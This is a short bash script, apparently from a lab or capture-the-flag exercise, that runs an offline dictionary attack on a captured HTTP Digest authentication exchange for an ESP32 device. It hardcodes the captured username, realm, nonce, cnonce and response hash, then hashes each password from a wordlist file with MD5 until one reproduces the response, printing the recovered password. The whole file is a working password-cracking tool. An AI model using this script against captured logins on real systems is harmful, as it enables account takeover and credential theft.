#!/bin/bash
#Authorization: Digest

 
username="alice"
realm="ESP32 Auth Realm"
nonce="f71c1a0ee32fe388c45caf821405f2be"
uri="/login"
cnonce="ZmIxYjU2ZmZjMzYyZWM2NzhkYThhOTAzYjI2N2NlMGE="
nc=00000001
qop=auth
response="8c806a5a42f69c674ccbaa7e8de87b4a"
opaque="0eccb6e4b80a9ea569a5a5b5984dc185"


while read ligne
do
    mdp=$ligne
    Hash1=$(echo -n $username":"$realm":"$mdp|md5sum|cut -d" " -f1)
    Hash2=$(echo -n "GET:"$uri|md5sum|cut -d" " -f1)
    result=$(echo -n $Hash1":"$nonce":"$nc":"$cnonce":"$qop":"$Hash2|md5sum|cut -d" " -f1)
    #echo -n $Hash1":"$nonce":"$nc":"$cnonce":"$qop":"$Hash2
    if [ "$response" = "$result" ] 
    then
        echo "Right Login/PASSWORD" $mdp
        exit
    else
        echo "Test :" $mdp
    fi
done < dico.txt
#echo $result
